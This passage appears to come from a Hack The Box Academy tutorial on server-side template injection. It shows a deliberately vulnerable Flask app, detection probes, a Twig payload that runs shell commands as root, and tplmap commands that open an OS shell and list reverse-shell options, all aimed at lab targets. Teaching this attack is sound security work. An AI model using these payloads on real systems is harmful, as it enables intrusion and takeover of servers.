    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span></span><span class="hljs-template-variable">{{title}}</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-variable">{{content}}</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
</code></pre>
<p>When we visit the website, we will receive an HTML page containing the values of the <code>title</code> and <code>content</code> variables evaluated inside the double brackets on the template page. Pretty straightforward, and as we can see, the user does not have any control over the variables. What happens when user input enters a template without any validation, though?</p>
<p><strong>app.py</strong></p>
<pre><code class="lang-python"><span class="hljs-comment">#/usr/bin/python3</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *

app = Flask(__name__, template_folder=<span class="hljs-string">"./"</span>)

<span class="hljs-meta">@app.route("/")</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
    title = <span class="hljs-string">"Index Page"</span>
    content = <span class="hljs-string">"Some content"</span>
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>, title=title, content=content)

<span class="hljs-meta">@app.route("/hello", methods=['GET'])</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span>:</span>
    name = request.args.get(<span class="hljs-string">"name"</span>)
    <span class="hljs-keyword">if</span> name == <span class="hljs-keyword">None</span>:
        <span class="hljs-keyword">return</span> redirect(f<span class="hljs-string">'{url_for("hello")}?name=guest'</span>)
    htmldoc = f<span class="hljs-string">"""
    &lt;html&gt;
    &lt;body&gt;
    &lt;h1&gt;Hello&lt;/h1&gt;
    &lt;a&gt;Nice to see you {name}&lt;/a&gt;
    &lt;/body&gt;
    &lt;/html&gt;
    """</span>
    <span class="hljs-keyword">return</span> render_template_string(htmldoc)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    app.run(host=<span class="hljs-string">"127.0.0.1"</span>, port=<span class="hljs-number">5000</span>)
</code></pre>
<p>In this case, we can inject a template expression directly, and the server will evaluate it. This is a security issue that could lead to remote code execution on the target application, as we will see in the following sections.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> curl -gis 'http://127.0.0.1:5000/hello?name={{7<span class="hljs-symbol">*</span>7}}'

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/2.0.2 Python/3.9.7
Date: Mon, 25 Oct 2021 00:12:40 GMT


    <span class="hljs-variable">&lt;html&gt;</span>
    <span class="hljs-variable">&lt;body&gt;</span>
    <span class="hljs-variable">&lt;h1&gt;</span>Hello<span class="hljs-variable">&lt;/h1&gt;</span>
    <span class="hljs-variable">&lt;a&gt;</span>Nice to see you 49<span class="hljs-variable">&lt;/a&gt;</span> <span class="hljs-comment"># &lt;-- Expresion evaluated</span>
    <span class="hljs-variable">&lt;/body&gt;</span>
    <span class="hljs-variable">&lt;/html&gt;</span>
</code></pre>
<h2 id="ssti-identification">SSTI Identification</h2>
<hr>
<p>We can detect SSTI vulnerabilities by injecting different tags in the inputs we control to see if they are evaluated in the response. We don&#39;t necessarily need to see the injected data reflected in the response we receive. Sometimes it is just evaluated on different pages (blind).</p>
<p>The easiest way to detect injections is to supply mathematical expressions in curly brackets, for example:</p>
<p>Code: html</p>
<pre><code class="lang-html">{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}
${<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}
#{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}
%{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}
{{<span class="hljs-number">7</span>*<span class="hljs-number">7</span>}}
...
</code></pre>
<p>We will look for &quot;49&quot; in the response when injecting these payloads to identify that server-side evaluation occurred.</p>
<p>The most difficult way to identify SSTI is to fuzz the template by injecting combinations of special characters used in template expressions. These characters include <code>${{&lt;%[%&#39;&quot;}}%\</code>. If an exception is caused, this means that we have some control over what the server interprets in terms of template expressions.</p>
<p>We can use tools such as <a href="https://github.com/epinna/tplmap">Tplmap</a> or J2EE Scan (Burp Pro) to automatically test for SSTI vulnerabilities or create a payload list to use with Burp Intruder or ZAP.</p>
<p>The diagram below from <a href="https://portswigger.net/research/server-side-template-injection">PortsSwigger</a> can help us identify if we are dealing with an SSTI vulnerability and also identify the underlying template engine.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png" alt="image"></p>
<p>In addition to the above diagram, we can try the following approaches to recognize the technology we are dealing with:</p>
<ul>
<li>Check verbose errors for technology names. Sometimes just copying the error in Google search can provide us with a straight answer regarding the underlying technology used</li>
<li>Check for extensions. For example, .jsp extensions are associated with Java. When dealing with Java, we may be facing an expression language/OGNL injection vulnerability instead of traditional SSTI</li>
<li>Send expressions with unclosed curly brackets to see if verbose errors are generated. Do not try this approach on production systems, as you may crash the webserver.</li>
</ul>
<h2 id="ssti-exploitation-example-1">SSTI Exploitation Example 1</h2>
<hr>
<p>Suppose that we are pentesting an internet-facing application (the target can be spawned at the end of this section). Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.</p>
<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you will come across the application below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig1.png" alt="image"></p>
<p>Let us submit on the input field mathematical expressions in curly brackets, such as the ones mentioned on the <code>SSTI Identification</code> section, starting with <code>{7*7}</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig2.png" alt="image"></p>
<p>It doesn&#39;t look like the application evaluated the submitted expression. Let us continue with another expression, <code>${7*7}</code> this time.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig3.png" alt="image"></p>
<p>It doesn&#39;t look like the application evaluated this expression either. What about <code>{{7*7}}</code>?</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig6.png" alt="image"></p>
<p>Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!</p>
<p>As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Let&#39;s use PortSwigger&#39;s diagram to assist us (shown in the previous section). We already know that the <code>{{7*7}}</code> expression was evaluated successfully. The next expression the diagram suggests trying is <code>{{7*&#39;7&#39;}}</code>. Let us try it and see how the application responds.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig_.png" alt="image"></p>
<p>The application successfully evaluated this expression as well. According to PortSwigger&#39;s diagram, we are dealing with either a Jinja2 or a Twig template engine.</p>
<p>There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one:</p>
<pre><code class="lang-php">{{_self.env.display(<span class="hljs-string">"TEST"</span>)}}
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig7.png" alt="image"></p>
<p>The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. For an extensive list of template engine-specific payloads, please refer to the following resources:</p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings - Template Injection</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks - SSTI (Server Side Template Injection)</a></li>
</ul>
<p>We could have automated the template engine identification process we just executed through <a href="https://github.com/epinna/tplmap">tplmap</a>, as follows. If you didn&#39;t notice, the user&#39;s input is submitted via the <code>name</code> parameter and through a POST request (hence the <code>-d</code> parameter in <code>tplmap</code>).</p>
<p><strong>tplmap.py</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
root@htb[/htb]$ cd tplmap
root@htb[/htb]$ pip <span class="hljs-keyword">install</span> virtualenv
root@htb[/htb]$ virtualenv -p python2 venv
root@htb[/htb]$ <span class="hljs-keyword">source</span> venv/<span class="hljs-keyword">bin</span>/<span class="hljs-keyword">activate</span>
root@htb[/htb]$ pip <span class="hljs-keyword">install</span> -r requirements.txt
root@htb[/htb]$ ./tplmap.py -u <span class="hljs-string">'http://&lt;TARGET IP&gt;:&lt;PORT&gt;'</span> -d <span class="hljs-keyword">name</span>=john

[+] Tplmap <span class="hljs-number">0.5</span>
    <span class="hljs-keyword">Automatic</span> <span class="hljs-keyword">Server</span>-Side <span class="hljs-keyword">Template</span> Injection Detection <span class="hljs-keyword">and</span> Exploitation Tool

[+] Testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-string">'name'</span> <span class="hljs-keyword">is</span> injectable
[+] Smarty <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'*'</span>
[+] Smarty <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing blind injection
[+] Mako <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'${*}'</span>
[+] Mako <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing blind injection
[+] Python <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'str(*)'</span>
[+] Python <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing blind injection
[+] Tornado <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'{{*}}'</span>
[+] Tornado <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing blind injection
[+] Jinja2 <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'{{*}}'</span>
[+] Jinja2 <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing blind injection
[+] Twig <span class="hljs-keyword">plugin</span> <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'{{*}}'</span>
[+] Twig <span class="hljs-keyword">plugin</span> has confirmed injection <span class="hljs-keyword">with</span> tag <span class="hljs-string">'{{*}}'</span>
[+] Tplmap <span class="hljs-keyword">identified</span> the <span class="hljs-keyword">following</span> injection point:

  POST parameter: <span class="hljs-keyword">name</span>
  <span class="hljs-keyword">Engine</span>: Twig
  Injection: {{*}}
  <span class="hljs-keyword">Context</span>: <span class="hljs-built_in">text</span>
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind <span class="hljs-keyword">and</span> <span class="hljs-keyword">reverse</span> shell: ok
   <span class="hljs-keyword">File</span> write: ok
   <span class="hljs-keyword">File</span> <span class="hljs-keyword">read</span>: ok
   Code evaluation: ok, php code

[+] Rerun tplmap providing one <span class="hljs-keyword">of</span> the <span class="hljs-keyword">following</span> options:

    <span class="hljs-comment">--os-shell                Run shell on the target</span>
    <span class="hljs-comment">--os-cmd                Execute shell commands</span>
    <span class="hljs-comment">--bind-shell PORT            Connect to a shell bind to a target port</span>
    <span class="hljs-comment">--reverse-shell HOST PORT    Send a shell back to the attacker's port</span>
    <span class="hljs-comment">--upload LOCAL REMOTE    Upload files to the server</span>
    <span class="hljs-comment">--download REMOTE LOCAL    Download remote files</span>
</code></pre>
<p>The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable <code>_self</code>, which, in simple terms, makes a few of the internal APIs public. This <code>_self</code> object has been documented, so we don&#39;t need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the <code>getFilter</code> function as it allows execution of a user-defined function via the following process:</p>
<ul>
<li>Register a function as a filter callback via <code>registerUndefinedFilterCallback</code></li>
<li>Invoke <code>_self.env.getFilter()</code> to execute the function we have just registered</li>
</ul>
<p><strong>Payload</strong></p>
<pre><code class="lang-php">{{_self.env.registerUndefinedFilterCallback(<span class="hljs-string">"system"</span>)}}{{_self.env.getFilter(<span class="hljs-string">"id;uname -a;hostname"</span>)}}
</code></pre>
<p>Let&#39;s submit the payload using cURL this time.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -X POST -d 'name=</span><span class="hljs-template-variable">{{_self.env.registerUndefinedFilterCallback("system")}}</span><span class="xml"></span><span class="hljs-template-variable">{{_self.env.getFilter("id;uname -a;hostname")}}</span><span class="xml">' http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>

<span class="hljs-meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"css/default.css"</span> <span class="hljs-attr">media</span>=<span class="hljs-string">"screen"</span>/&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>SSTI<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"title"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>I'm here to say hello<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>


<span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>
    Who are you?
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">'post'</span> <span class="hljs-attr">action</span>=<span class="hljs-string">''</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span> 
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"Name"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"name"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">70</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">input</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-default"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'submit'</span>&gt;</span>Send<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
       <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> 
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
Hello uid=0(root) gid=0(root) groups=0(root)
Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
serversideattackssstitwig-60784-78bd58b5b-pmvvv
serversideattackssstitwig-60784-78bd58b5b-pmvvv!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>

        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"clearer"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"footer"</span>&gt;</span>Break me!<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>As we can see in the output/response above, the submitted payload was evaluated, and the specified commands (<code>id</code>, <code>uname -a</code>, and <code>hostname</code>) were executed successfully.</p>
<p>Again, we could have automated the template engine exploitation process we just executed through <a href="https://github.com/epinna/tplmap">tplmap</a>, as follows.</p>
<p><strong>tplmap.py - OS Shell</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./tplmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">'http://&lt;TARGET IP&gt;:&lt;PORT&gt;'</span> -d name=john --os-<span class="hljs-keyword">shell</span>

[+] Tplmap <span class="hljs-number">0.5</span>
    Automatic Server-Side Template Injection Detection <span class="hljs-built_in">and</span> Exploitation Tool

[+] Testing <span class="hljs-keyword">if</span> POST parameter <span class="hljs-string">'name'</span> <span class="hljs-keyword">is</span> injectable
[+] Smarty plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'*'</span>
[+] Smarty plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Mako plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'${*}'</span>
[+] Mako plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Python plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'str(*)'</span>
[+] Python plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Tornado plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'{{*}}'</span>
[+] Tornado plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Jinja2 plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'{{*}}'</span>
[+] Jinja2 plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Twig plugin <span class="hljs-keyword">is</span> testing rendering with <span class="hljs-keyword">tag</span> <span class="hljs-string">'{{*}}'</span>
[+] Twig plugin <span class="hljs-built_in">has</span> confirmed injection with <span class="hljs-keyword">tag</span> <span class="hljs-string">'{{*}}'</span>
[+] Tplmap identified the following injection poin<span class="hljs-variable">t:</span>

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Contex<span class="hljs-variable">t:</span> text
  OS: Linux
  Technique: render
  Capabilitie<span class="hljs-variable">s:</span>

   Shell <span class="hljs-keyword">command</span> execution: ok
   Bind <span class="hljs-built_in">and</span> <span class="hljs-built_in">reverse</span> shel<span class="hljs-variable">l:</span> ok
   File <span class="hljs-keyword">write</span>: ok
   File <span class="hljs-keyword">read</span>: ok
   Code evaluation: ok, php code

[+] Run commands <span class="hljs-keyword">on</span> the operating <span class="hljs-built_in">system</span>.

Linux $
</code></pre>
<p>We can now execute any command of our choosing through the shell <code>tplmap</code> established for us!</p>
<p>Now, proceed to this section&#39;s exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of <code>tplmap</code>.</p>
<p>Note: When we notice that the mathematical expressions we submit are evaluated, the application may be vulnerable to XSS as well.</p>
<p>Let us test the above statement by submitting an XSS payload inside curly brackets to this section&#39;s exercise target. The result of doing so can be seen in the image below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig8.png" alt="image"></p>
<h2 id="ssti-exploitation-example-2">SSTI Exploitation Example 2</h2>
<hr>
<p>Suppose we are tasked with pentesting yet another internet-facing application. Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.</p>
<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code>, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you should come across the application below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tornado1.png" alt="image"></p>
<p>If you inspect the application&#39;s traffic using Firefox&#39;s Web Developer Tools (<code>[Ctrl]</code>+<code>[Shift]</code>+<code>[I]</code>), you will notice that user input is submitted inside a parameter called <code>email</code> and through a POST request to <code>http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></p>
<p>Let&#39;s submit mathematical expressions in curly brackets to the input field, such as the ones mentioned in the <code>SSTI Identification</code> section, starting with <code>${7*7}</code>, as PortSwigger&#39;s diagram suggests.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/jointheteam

<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">form</span> {
<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
<span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>~ Damn Hackers ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>Gentlemen, we can rebuild it <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the technology <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the capability to make the worlds first bionic website<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better than it was before <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better, Stronger, Faster.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Great!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Email ${7*7} has been subscribed. You&amp;#39;ll hear from us soon!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>It doesn&#39;t look like the application evaluated the submitted expression. Let&#39;s try <code>{{7*7}}</code></p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -X POST -d 'email=</span><span class="hljs-template-variable">{{7*7}}</span><span class="xml">' http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/jointheteam

<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">form</span> {
<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
<span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>~ Damn Hackers ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>Gentlemen, we can rebuild it <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the technology <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the capability to make the worlds first bionic website<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better than it was before <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better, Stronger, Faster.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Great!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>Email 49 has been subscribed. You&amp;#39;ll hear from us soon!<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>The application evaluated the submitted expression this time. Let&#39;s continue, as PortSwigger&#39;s diagram suggests, to identify the underlying template engine.</p>
<p><strong>cURL - Interacting with the Target</strong></p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -X POST -d 'email=</span><span class="hljs-template-variable">{{7*'7'}}</span><span class="xml">' http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/jointheteam

<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">form</span> {
<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
<span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>~ Damn Hackers ~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"text-align: center;"</span>&gt;</span>Gentlemen, we can rebuild it <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the technology <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>We have the capability to make the worlds first bionic website<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better than it was before <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Better, Stronger, Faster.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
